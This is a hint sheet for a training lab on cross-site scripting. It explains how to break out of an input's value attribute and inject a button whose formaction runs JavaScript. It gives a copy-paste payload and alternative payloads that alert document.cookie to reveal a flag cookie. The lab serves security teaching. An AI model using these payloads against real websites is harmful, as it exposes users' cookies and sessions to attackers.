# Formaction XSS Lab - Quick Hints

## 🎯 Goal
Extract the flag from `xss_flag` cookie and show it in an alert.

---

## 💡 Hints (Progressive)

### Level 1 - Understand the Vulnerability
✅ The form uses **POST** method (check the HTML)
✅ Your input appears in a `<input value="...">` attribute
✅ The application doesn't encode the output

### Level 2 - Analyze the Injection Point
✅ Look at the HTML structure where your input appears
✅ You're inside an attribute: `<input value="YOUR_INPUT">`
✅ To escape: Close the attribute with `"`, then close the tag with `>`

### Level 3 - Research the Attack Vector
✅ HTML5 `<button>` elements have a `formaction` attribute
✅ The `formaction` can contain `javascript:` URIs
✅ Example: `<button formaction="javascript:alert(1)">Click me</button>`

### Level 4 - Craft the Payload
Structure your payload like this:
```
"><button formaction="javascript:alert(document.cookie)">Click me
```

Breaking it down:
- `"` - Closes the value attribute
- `>` - Closes the input tag
- `<button formaction="...">` - Injects button with JavaScript
- When clicked, it shows cookies

### Level 5 - Complete the Exploit
1. Enter payload in search box
2. Click "Search"
3. A button appears on the page
4. Click the injected button
5. Alert shows cookies with the flag

---

## 🚀 Quick Start Payload

Copy and paste this into the search box:

```html
"><button formaction="javascript:alert(document.cookie)">Click for Flag!
```

Then click the "Search" button, and click the button that appears!

---

## 🔍 Why This Works

The rendered HTML becomes:
```html
<input type="text" value=""><button formaction="javascript:alert(document.cookie)">Click for Flag!" readonly>
```

This creates:
1. A closed input element with empty value
2. A new button with formaction that executes JavaScript
3. When clicked, it shows all cookies including the flag

---

## 📋 Alternative Payloads

```html
"><button formaction="javascript:alert(document.cookie)">XSS</button>
```

```html
"><input type=submit formaction="javascript:alert(document.cookie)" value=Click>
```

```html
" autofocus onfocus="alert(document.cookie)" >
```
(last one uses autofocus event instead)
